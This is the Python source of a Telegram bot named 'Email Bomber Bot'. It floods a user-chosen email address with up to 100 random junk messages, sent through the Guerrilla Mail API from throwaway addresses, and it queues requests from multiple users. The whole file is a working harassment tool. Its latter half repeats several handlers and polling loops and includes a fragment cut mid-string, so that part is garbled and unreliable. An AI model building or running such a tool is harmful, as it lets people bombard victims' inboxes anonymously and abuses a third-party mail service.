import telebot
import requests
import random
import string
import time
import threading
from collections import deque
from datetime import datetime
from flask import Flask
import os

from config import BOT_TOKEN

# Flask dummy server to keep Render alive
app = Flask(__name__)

@app.route('/')
def home():
    return "Email Bomber Bot is alive and running on Render!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    print(f"Flask keep-alive starting on 0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
    print(f"Flask bound to port {port}")

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()
time.sleep(2)  # give time for Flask to bind

bot = telebot.TeleBot(BOT_TOKEN)

# Global state
bomb_lock = threading.Lock()
current_operation = None
queue = deque()
user_data = {}

GUERRILLA_DOMAINS = [
    'sharklasers.com', 'grr.la', 'guerrillamail.com', 'guerrillamail.de',
    'guerrillamail.net', 'guerrillamail.org', 'guerrillamail.biz'
]

def get_new_temp_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(GUERRILLA_DOMAINS)
    return f"{username}@{domain}"

def generate_random_subject():
    prefixes = ['Signal', 'Drop', 'Echo', 'Void', 'Pulse', 'Noise']
    return f"{random.choice(prefixes)} #{random.randint(1000, 9999)}"

def generate_random_body():
    templates = [
        "Random transmission received. No origin detected.",
        "Pointless data packet delivered to inbox.",
        "Clutter level increased by one unit.",
        "Null message arrived for no reason.",
        "Entropy injection complete."
    ]
    filler = ''.join(random.choices(string.ascii_letters + string.digits + ' .,!?', k=random.randint(30, 80)))
    return random.choice(templates) + " " + filler

def send_via_guerrilla(to_email, subject, body):
    try:
        session = requests.Session()
        resp = session.get('https://api.guerrillamail.com/ajax.php?f=get_email_address')
        data = resp.json()
        sid = data.get('sid_token')
        if not sid:
            return False

        from_email = get_new_temp_email()

        payload = {
            'f': 'send_email',
            'sid_token': sid,
            'to': to_email,
            'from': from_email,
            'subject': subject,
            'body': body
        }
        send_resp = session.post('https://api.guerrillamail.com/ajax.php', data=payload)
        result = send_resp.json()
        return result.get('status') == 'sent'
    except Exception as e:
        print(f"Send error: {e}")
        return False

def run_bomb_operation():
    global current_operation
    op = current_operation
    chat_id = op['chat_id']
    user_id = op['user_id']
    sent = 0
    consecutive_fails = 0

    bot.send_message(chat_id, f"Welcome to the Email Bomber Bot\nOperation started. Target: {op['target']} | Messages: {op['count']} | Delay: {op['interval']}s")

    start_time = datetime.now()

    for i in range(op['count']):
        if current_operation is None or current_operation['user_id'] != user_id:
            break

        subj = generate_random_subject()
        body = generate_random_body()
        success = send_via_guerrilla(op['target'], subj, body)

        if success:
            sent += 1
            consecutive_fails = 0
        else:
            consecutive_fails += 1

        if consecutive_fails >= 3:
            bot.send_message(chat_id, f"Welcome to the Email Bomber Bot\nService restrictions encountered. Stopped at {sent}/{op['count']}")
            break

        if (i + 1) % 5 == 0:
            elapsed = (datetime.now() - start_time).total_seconds()
            if elapsed > 0:
                rate = (i + 1) / elapsed
                remaining = op['count'] - (i + 1)
                eta_sec = remaining / rate if rate > 0 else remaining * op['interval']
                eta_min = int(eta_sec // 60)
                eta_sec_rem = int(eta_sec % 60)
                bot.send_message(chat_id, f"Welcome to the Email Bomber Bot\nProgress: {sent}/{op['count']} sent\nEstimated remaining: {eta_min} min {eta_sec_rem} sec")

        time.sleep(op['interval'])

    bot.send_message(chat_id, f"Welcome to the Email Bomber Bot\nOperation completed. Messages sent: {sent}/{op['count']}")
    current_operation = None
    if queue:
        next_req = queue.popleft()
        current_operation = next_req.copy()
        current_operation['sent'] = 0
        current_operation['start_time'] = datetime.now()
        threading.Thread(target=run_bomb_operation).start()
        bot.send_message(next_req['chat_id'], f"Welcome to the Email Bomber Bot\nYour turn has started. Target: {next_req['target']} | Messages: {next_req['count']}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nThis tool sends random messages from disposable addresses.\nLimited capacity: approximately 20–50 messages maximum.\nType /help for commands.")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    text = ("Welcome to the Email Bomber Bot\n"
            "Available commands:\n"
            "/target <email> — Set target email address\n"
            "/count <number> — Set number of messages (1–100)\n"
            "/interval <seconds> — Set delay between messages (3–30, default 3)\n"
            "/bomb — Start sending (requires confirmation)\n"
            "/queue — Check queue position and ETA\n"
            "/cancel — Remove from queue\n"
            "/status — View current settings and status\n"
            "/stop — Stop your current operation\n"
            "/reset — Clear all settings")
    bot.reply_to(message, text)

@bot.message_handler(commands=['target'])
def set_target(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            raise ValueError
        email = parts[1].strip()
        if '@' not in email or '.' not in email.split('@')[-1]:
            bot.reply_to(message, "Welcome to the Email Bomber Bot\nInvalid email format. Example: user@domain.com")
            return
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['target'] = email
        bot.reply_to(message, f"Welcome to the Email Bomber Bot\nTarget email set: {email}\nNext: use /count <number>")
    except:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nUsage: /target email@example.com")

@bot.message_handler(commands=['count'])
def set_count(message):
    try:
        num = int(message.text.split()[1])
        if not 1 <= num <= 100:
            raise ValueError
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['count'] = num
        bot.reply_to(message, f"Welcome to the Email Bomber Bot\nNumber of messages set to {num}")
    except:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nUsage: /count 35 (1–100 allowed)")

@bot.message_handler(commands=['interval'])
def set_interval(message):
    try:
        sec = int(message.text.split()[1])
        if not 3 <= sec <= 30:
            raise ValueError
        uid = message.from_user.id
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['interval'] = sec
        bot.reply_to(message, f"Welcome to the Email Bomber Bot\nDelay set to {sec} seconds")
    except:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nUsage: /interval 5 (3–30 seconds)")

@bot.message_handler(commands=['bomb'])
def bomb_cmd(message):
    uid = message.from_user.id
    if uid not in user_data or 'target' not in user_data[uid] or 'count' not in user_data[uid]:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nPlease set /target and /count first.")
        return

    interval = user_data[uid].get('interval', 3)
    target = user_data[uid]['target']
    count = user_data[uid]['count']

    msg = bot.reply_to(message, f"Welcome to the Email Bomber Bot\nConfirm sending {count} messages to {target} with {interval}s delay.\nReply with YES to proceed.")
    bot.register_next_step_handler(msg, lambda m: confirm_bomb_handler(m, uid, message.chat.id, target, count, interval))

def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
    if message.text.strip().upper() != 'YES':
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nOperation cancelled.")
        return

    global current_operation
    with bomb_lock:
        if current_operation:
            queue.append({
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'chat_id': chat_id
            })
            pos = len(queue)
            bot.reply_to(message, f"Welcome to the Email Bomber Bot\nAdded to queue. Position: {pos}\nUse /queue to check status.")
        else:
            current_operation = {
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'sent': 0,
                'start_time': datetime.now(),
                'chat_id': chat_id
            }
            threading.Thread(target=run_bomb_operation).start()

@bot.message_handler(commands=['queue'])
def queue_cmd(message):
    if not queue:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nQueue is empty.")
        return
    uid = message.from_user.id
    pos = 1
    found = False
    for req in queue:
        if req['user_id'] == uid:
            found = True
            bot.reply_to(message, f"Welcome to the Email Bomber Bot\nYour position: {pos} of {len(queue)}\nTarget: {req['target']}\nCount: {req['count']}")
            break
        pos += 1
    if not found:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting on Render...")
print("Flask keep-alive thread started – waiting for bind...")
bot.infinity_polling(skip_pending=True, none_stop=True)
def queue_cmd(message):
    if not queue:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nQueue is empty.")
        return
    uid = message.from_user.id
    pos = 1
    found = False
    for req in queue:
        if req['user_id'] == uid:
            found = True
            bot.reply_to(message, f"Welcome to the Email Bomber Bot\nYour position: {pos} of {len(queue)}\nTarget: {req['target']}\nCount: {req['count']}")
            break
        pos += 1
    if not found:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting on Render...")
print("Flask keep-alive server thread started – waiting for bind confirmation...")
bot.infinity_polling(skip_pending=True, none_stop=True)omber Bot\nYou are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    old_len = len(queue)
    queue = deque([req for req in queue if req['user_id'] != uid])
    if len(queue) < old_len:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nRemoved from queue.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nYou were not in queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    text = "Welcome to the Email Bomber Bot\n"
    if uid in user_data:
        d = user_data[uid]
        text += f"Target: {d.get('target', 'not set')}\nCount: {d.get('count', 'not set')}\nInterval: {d.get('interval', 3)} seconds\n"
    else:
        text += "No settings configured.\n"
    if current_operation:
        text += "Operation in progress.\n"
    text += f"Queue length: {len(queue)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nCurrent operation stopped.")
    else:
        bot.reply_to(message, "Welcome to the Email Bomber Bot\nNo active operation to stop or not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, "Welcome to the Email Bomber Bot\nAll settings cleared.")

print("Email Bomber Bot starting...")
bot.infinity_polling()
